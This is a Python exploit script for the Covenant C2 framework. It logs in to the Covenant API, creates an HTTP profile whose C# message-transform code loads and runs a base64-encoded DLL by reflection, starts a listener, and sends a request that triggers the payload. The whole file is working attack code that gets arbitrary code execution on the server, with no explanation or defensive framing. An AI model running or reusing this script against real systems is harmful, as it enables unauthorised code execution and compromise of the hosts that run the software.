import base64
import random
import requests
import urllib3
import uuid
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SERVER_URL = "192.168.0.227"
COVENANT_PORT = 7443
USERNAME = "hyper"
PASSWORD = "admin"

with open('./ShellcodeAssembly.dll', 'rb') as f:
    base64exploit = base64.b64encode(f.read()).decode()

url = f"https://{SERVER_URL}:{COVENANT_PORT}"
headers = {
    'accept': 'text/plain',
    'Content-Type': 'application/json-patch+json',
}

data = {"userName": USERNAME,  "password": PASSWORD}

s = requests.Session()

response = s.post(f'{url}/api/users/login',
                  headers=headers, json=data, verify=False)
if not response.ok or not response.json()["success"]:
    print("Failed to login")
    print(response.text)
    exit()

token = response.json()["covenantToken"]
print(f"Fetched covenant token: {token}")

headers["Authorization"] = f"Bearer {token}"

transform = """public static class MessageTransform
{
    public static string Transform(byte[] bytes)
    {
        return System.Convert.ToBase64String(bytes);
    }
    public static byte[] Invert(string str)
    {
        try
        {
            string assemblyBase64 = " """ + base64exploit + """ ";
            var assemblyBytes = System.Convert.FromBase64String(assemblyBase64);
            var assembly = System.Reflection.Assembly.Load(assemblyBytes);
            foreach (var type in assembly.GetTypes()) {
                object instance = System.Activator.CreateInstance(type);
                object[] args = new object[] { new string[] { "" } };
                try {
                    type.GetMethod("Main").Invoke(instance, args);
                }
                catch {}
            }
        }
        catch {}
        return System.Convert.FromBase64String(str);
    }
}
"""

profile_id = random.randint(10000, 20000)
profile_name = str(uuid.uuid4())

data = {
    "id": profile_id,
    "name": profile_name,
    "description": "",
    "type": "HTTP",
    "messageTransform": transform,
    'httpUrls': [],
    'httpRequestHeaders': [],
    'httpResponseHeaders': [],
    'httpPostRequest': 'd={DATA}',
    'httpGetResponse': '<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {DATA}\n    </body>\n</html>\n',
    'httpPostResponse': '<html>\n    <head>\n        <title>Hello World!</title>\n    </head>\n    <body>\n        <p>Hello World!</p>\n        // Hello World! {DATA}\n    </body>\n</html>\n',
}

response = s.post(f'{url}/api/profiles/http',
                  headers=headers, json=data, verify=False)
if not response.ok:
    print(response.text)
    exit()

print(f"Created malicious profile name {profile_name}")

listener_port = random.randint(49999, 60000)

data = {
    "bindAddress": "0.0.0.0",
    "bindPort": listener_port,
    "connectAddresses": [
        "0.0.0.0"
    ],
    "connectPort": listener_port,
    "profileId": profile_id,
    "listenerTypeId": 1,
    "status": "Active"
}

response = s.post(f'{url}/api/listeners/http',
                  headers=headers, json=data, verify=False)
if not response.ok:
    print(response.text)
    exit()

print(f"Started Covenant listener on port {listener_port}")

print(f"Sending payload to trigger invert")

listener_url = f"http://{SERVER_URL}:{listener_port}"

data = f'd=e30K'
response = requests.post(
    f'{listener_url}/index.html?id=blabla', data=data, verify=False)
print(response)
print("Payload is triggered, 404 response to final request is expected")
